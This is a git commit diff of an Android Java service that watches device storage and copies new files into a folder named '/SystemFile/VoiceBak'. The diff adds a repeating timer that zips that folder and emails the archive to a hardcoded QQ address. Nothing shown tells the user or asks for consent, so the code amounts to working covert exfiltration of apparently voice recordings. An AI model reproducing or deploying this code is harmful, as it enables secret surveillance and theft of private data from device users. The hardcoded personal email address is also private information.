1fa2dac8d425d079dbb3b4cd0c35ec5d0d898bf0
XTS-YFR <CapRobin@yeah.net>
2021-06-04 15:14:54 +0800

    代码优化

--- AppService/src/main/java/com/mail/service/MyService.java
+++ AppService/src/main/java/com/mail/service/MyService.java
@@ -7,11 +7,9 @@ import android.os.IBinder;
 import android.util.Log;
 
 import com.alibaba.fastjson.JSONArray;
-import com.alibaba.fastjson.JSONObject;
 import com.mail.filemonitor.FileListener;
 import com.mail.filemonitor.FileMonitor;
 import com.mail.interfaces.MyInterface;
-import com.mail.utils.DirTraversal;
 import com.mail.utils.MethodUtil;
 import com.mail.utils.MyApplication;
 import com.mail.utils.Preferences;
@@ -19,11 +17,7 @@ import com.mail.utils.ZipUtils;
 import com.shidian.mail.SendMailUtil;
 
 import java.io.File;
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
 import java.io.IOException;
-import java.io.OutputStream;
-import java.text.ParseException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
@@ -77,38 +71,46 @@ public class MyService extends Service implements MyInterface.ActivityCallBack {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        //启动文件监听服务
-        startFileListener();
-        //启动定时任务
-        TimerManager();
-        Log.v("onStartCommand", "MyService onStartCommand----------------------------->>");
+        //创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。
         ExecutorService threadPool = Executors.newCachedThreadPool();
+        //启动文件监听线程
         threadPool.execute(new Runnable() {
             @Override
             public void run() {
-                int time = 0;
-                while (true) {
-                    Log.d("Jason", "time:" + time);
-                    try {
-                        Thread.sleep(60000);
-                        System.out.print("开始发送短信----------------------------->>");
-//                        Log.d("RUN", "开始发送短信----------------------------->>");
-                        //开始发送普通邮件
-//                        SendMailUtil.send("756657266@qq.com");
-
-                        //开始发送文件邮件
-                        //sendFileEmail();
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    }
-                    time++;
-                }
+                System.out.print("启动文件监听线程----------------------------->>");
+                //启动文件监听线程
+                fileListener();
             }
         });
+        //启动定时发送邮件线程
+        threadPool.execute(new Runnable() {
+            @Override
+            public void run() {
+                System.out.print("启动定时发送邮件线程----------------------------->>");
+                //启动定时发送邮件线程
+                TimerTaskManager();
+            }
+        });
+        //线程池周期性执行任务
+//        threadPool.execute(new Runnable() {
+//            @Override
+//            public void run() {
+//                int time = 0;
+//                while (true) {
+//                    try {
+//                        //任务执行时间,此处设置1分钟执行一次任务
+//                        Thread.sleep(60 * 1000);
+//                        System.out.print("第" + (time + 1) + "次执行循环任务----------------------------->>");
+//                    } catch (InterruptedException e) {
+//                        e.printStackTrace();
+//                    }
+//                    time++;
+//                }
+//            }
+//        });
 
         return super.onStartCommand(intent, flags, startId);
     }
-
 
     /**
      * Describe：启动文件监听服务
@@ -116,7 +118,7 @@ public class MyService extends Service implements MyInterface.ActivityCallBack {
      * Return: void
      * Date：2021-05-26 13:33:34
      */
-    public static void startFileListener() {
+    public static void fileListener() {
         //判断SD卡是否存在
         boolean isHasSdCard = Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
         if (isHasSdCard) {
@@ -140,68 +142,11 @@ public class MyService extends Service implements MyInterface.ActivityCallBack {
     }
 
     /**
-     * Describe：发送带附件邮件
-     * Params: []
+     * Describe：文件操作监听回调
+     * Params: [optType, file]
      * Return: void
-     * Date：2021-05-06 19:55:59
+     * Date：2021-06-04 14:34:36
      */
-    public static void sendFileEmail_bak() {
-        File file = new File(Environment.getExternalStorageDirectory() + File.separator + "EmailFile.txt");
-//        Date date = new Date();
-//        String dateStr = date.toString();
-//        //本地文件存储
-//        boolean isSave = MethodsUtil.writeFile("测试数据测试数据......" + dateStr, file);
-//        System.out.print("isSave----------------------------->>" + isSave);
-        OutputStream os = null;
-        try {
-            os = new FileOutputStream(file);
-            String str = "发送带附件邮件测试";
-            byte[] data = str.getBytes();
-            os.write(data);
-        } catch (FileNotFoundException e) {
-            e.printStackTrace();
-        } catch (IOException e) {
-            e.printStackTrace();
-        } finally {
-            try {
-                if (os != null) os.close();
-            } catch (IOException e) {
-            }
-        }
-        SendMailUtil.send(file, "756657266@qq.com");
-    }
-    /**
-     * Describe：发送带附件邮件
-     * Params: []
-     * Return: void
-     * Date：2021-05-06 19:55:59
-     */
-    public static void sendFileEmail(File files) {
-//        File files = new File(Environment.getExternalStorageDirectory() + File.separator + "EmailFile.txt");
-//        Date date = new Date();
-//        String dateStr = date.toString();
-//        //本地文件存储
-//        boolean isSave = MethodsUtil.writeFile("测试数据测试数据......" + dateStr, file);
-//        System.out.print("isSave----------------------------->>" + isSave);
-        OutputStream os = null;
-        try {
-            os = new FileOutputStream(files);
-            String str = "发送带附件邮件测试";
-            byte[] data = str.getBytes();
-            os.write(data);
-        } catch (FileNotFoundException e) {
-            e.printStackTrace();
-        } catch (IOException e) {
-            e.printStackTrace();
-        } finally {
-            try {
-                if (os != null) os.close();
-            } catch (IOException e) {
-            }
-        }
-        SendMailUtil.send(files, "756657266@qq.com");
-    }
-
     @Override
     public void listenerToServiceMsg(int optType, File file) {
         switch (optType) {
@@ -265,36 +210,6 @@ public class MyService extends Service implements MyInterface.ActivityCallBack {
                     //新增文件拷贝另存
                     boolean isCopyFile = MethodUtil.fileCopy(file.getPath(), savedPath + file.getName());
                     System.out.println("文件拷贝---------------------->>" + isCopyFile);
-//
-//                    //判断当前时间是否与指定时间相等
-//                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-//                    String setTimeStr = "2021-06-03 14:55:00";
-//                    Date setTime = sdf.parse(setTimeStr);
-//                    Date nowTime = new Date();
-//                    String nowTimeStr = sdf.format(new Date());
-//                    if (nowTime.after(setTime)) {
-//                        File file1 = new File(savedPath);
-//                        //当前时间大于指定时间
-//                        if (file1.exists() && file1.isDirectory()) {
-//                            if (file1.list().length > 0) {
-//                            //Not empty, do something here.
-//                                System.out.println("文件夹下存放文件个数---------------------->>" + file1.list().length);
-//
-//                                //第一种方式压缩
-////                                LinkedList<File> files = DirTraversal.listLinkedFiles(sdPath+"/SystemFile/VoiceBak");
-////                                File fil = DirTraversal.getFilePath(sdPath+"/SystemFile/VoiceZip/", "VoiceBak("+nowTimeStr+").zip");
-////                                ZipUtils.zipFiles(files, fil);
-//
-//                                //第二种方式压缩文件
-////                                ZipUtils.zip(sdPath+"/Android/data/ZipData/TestData", sdPath+"/Android/data/ZipData/YsTestData.zip");
-//                                ZipUtils.zip(sdPath+"/SystemFile/VoiceBak", sdPath+"/SystemFile/VoiceZip/VoiceBak("+nowTimeStr+").zip");
-//                                //解压文件
-//                                //ZipUtils.unzip(pathString+"/Android/data/ZipData/YsTestData.zip", pathString+"/Android/data/ZipData/YsTestData");
-//                            }
-//                        }
-//
-//                    }
-
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
@@ -312,43 +227,30 @@ public class MyService extends Service implements MyInterface.ActivityCallBack {
         }
     }
 
-    //本地文件存储
-    private void localFile(int optType, File file) {
-        fileNameList.add(file.getPath());
-        String getJsonArrayStr = MyApplication.preference.getString("jsonArrayStr");
-        if (!getJsonArrayStr.trim().equals("")) {
-            jsonArray = JSONObject.parseArray(getJsonArrayStr);
-        }
-        JSONObject jsonObject = new JSONObject();
-        jsonObject.put("optType", optType);
-        jsonObject.put("directory", file.getPath());
-        jsonArray.add(jsonObject);
-        String jsonArrayStr = jsonArray.toJSONString();
 
-        //
-        MyApplication.preference.putString("jsonArrayStr", jsonArrayStr);
-        //Preferences.mPreferences.putString(Constant.USERPASSWORD, password);
-        //Preferences.mPreferences.putInt(Constant.USERTYPE, MyApplication.userType);
-    }
-
-
-    public static void TimerManager() {
-        System.out.print("开始定时任务---------------->>");
-        //间隔周期:1天
+    /**
+     * Describe：定时任务管理_发送邮件
+     * Params: []
+     * Return: void
+     * Date：2021-06-04 14:09:55
+     */
+    public static void TimerTaskManager() {
+        System.out.print("开始定时任务---------------->>\n\t");
+        //设置指定执行时间
         Calendar calendar = Calendar.getInstance();
         /*** 定制每日9:00执行方法 ***/
-        calendar.set(Calendar.HOUR_OF_DAY, 20);
+        calendar.set(Calendar.HOUR_OF_DAY, 9);
         calendar.set(Calendar.MINUTE, 0);
         calendar.set(Calendar.SECOND, 0);
-        /*** 定制每5秒执行 ***/
-//        calendar.set(Calendar.SECOND, 5);
-
         //第一次执行定时任务的时间
         Date date = calendar.getTime();
         //如果第一次执行定时任务的时间 小于 当前的时间；此时要在 第一次执行定时任务的时间 加一天，以便此任务在下个时间点执行。如果不加一天，任务会立即执行。
         if (date.before(new Date())) {
-            date = addDay(date, 10);
-//            date = addDay2(date, 1);
+            Calendar startDT = Calendar.getInstance();
+            startDT.setTime(date);
+            //设置指定执行周期，此处需要间隔一天执行
+            startDT.add(Calendar.MILLISECOND, 20000);
+            date = startDT.getTime();
         }
         String getDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(date);
         //循环任务
@@ -356,35 +258,23 @@ public class MyService extends Service implements MyInterface.ActivityCallBack {
             @Override
             public void run() {
                 // 逻辑处理
-                //                    Thread.sleep(5000);
-                //executeTask();
-                System.out.print("循环执行---------------->>");
-                executeTask();
+                sendEmailTask();
             }
         };
 
         //安排指定的任务在指定的时间开始进行重复的固定延迟执行。
         Timer timer = new Timer();
-        //timer.schedule(task, 0);          // 此处delay为0表示没有延迟，立即执行一次task
-        //timer.schedule(task, 1000);       // 延迟1秒，执行一次task
-        //timer.schedule(task, 0, 2000);        // 立即执行一次task，然后每隔2秒执行一次task
-        timer.schedule(task, date, PERIOD_DAY);
+        // 指定时间开始执行task，然后每隔一个时间周期执行一次task
+        timer.schedule(task, date, 20000);
     }
 
     /**
-     * Describe：增加或减少天数
-     * Params: [date, num]
-     * Return: java.util.Date
-     * Date：2021-01-07 18:21:13
+     * Describe：发送邮件任务
+     * Params: []
+     * Return: void
+     * Date：2021-06-04 14:08:30
      */
-    static Date addDay(Date date, int num) {
-        Calendar startDT = Calendar.getInstance();
-        startDT.setTime(date);
-        startDT.add(Calendar.MINUTE, num);
-        return startDT.getTime();
-    }
-
-    private static void executeTask() {
+    private static void sendEmailTask() {
         try {
             //判断当前时间是否与指定时间相等
             SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
@@ -393,30 +283,29 @@ public class MyService extends Service implements MyInterface.ActivityCallBack {
             //当前时间大于指定时间
             if (file1.exists() && file1.isDirectory()) {
                 if (file1.list().length > 0) {
-                    //Not empty, do something here.
-                    System.out.println("文件夹下存放文件个数---------------------->>" + file1.list().length);
-
                     //第一种方式压缩
-                    LinkedList<File> files = DirTraversal.listLinkedFiles(sdPath + "/SystemFile/VoiceBak");
-                    File fil = DirTraversal.getFilePath(sdPath + "/SystemFile/VoiceZip/", "VoiceBak(" + nowTimeStr + ").zip");
-                    ZipUtils.zipFiles(files, fil);
-                    Thread.sleep(30000);
-                    //第二种方式压缩文件
-////                  ZipUtils.zip(sdPath+"/Android/data/ZipData/TestData", sdPath+"/Android/data/ZipData/YsTestData.zip");
+//                    LinkedList<File> files = DirTraversal.listLinkedFiles(sdPath + "/SystemFile/VoiceBak");
+//                    File fil = DirTraversal.getFilePath(sdPath + "/SystemFile/VoiceZip/", "VoiceBak(" + nowTimeStr + ").zip");
+//                    ZipUtils.zipFiles(files, fil);
+
+                    //第二种方式压缩
                     String fileStr = sdPath + "/SystemFile/VoiceZip/VoiceBak(" + nowTimeStr + ").zip";
-//                    ZipUtils.zip(sdPath + "/SystemFile/VoiceBak", fileStr);
-                    File file = new File(fileStr);
-                    //开始发送文件邮件
-                    sendFileEmail(file);
-                    System.out.println("压缩文件成功---------------------->>");
+                    ZipUtils.zip(sdPath + "/SystemFile/VoiceBak", fileStr);
+
+                    System.out.println("文件已压缩---------------------->>压缩文件个数：" + file1.list().length);
+//                    Thread.sleep(30000);
+
+//                    //开始发送普通邮件
+//                    SendMailUtil.send("756657266@qq.com");
+                    //开始发送带附件的邮件
+                    SendMailUtil.send(new File(fileStr), "756657266@qq.com");
+                    System.out.println("邮件已发送---------------------->>");
 
                     //解压文件
                     //ZipUtils.unzip(pathString+"/Android/data/ZipData/YsTestData.zip", pathString+"/Android/data/ZipData/YsTestData");
                 }
             }
         } catch (IOException e) {
-            e.printStackTrace();
-        } catch (InterruptedException e) {
             e.printStackTrace();
         }
 //                    }
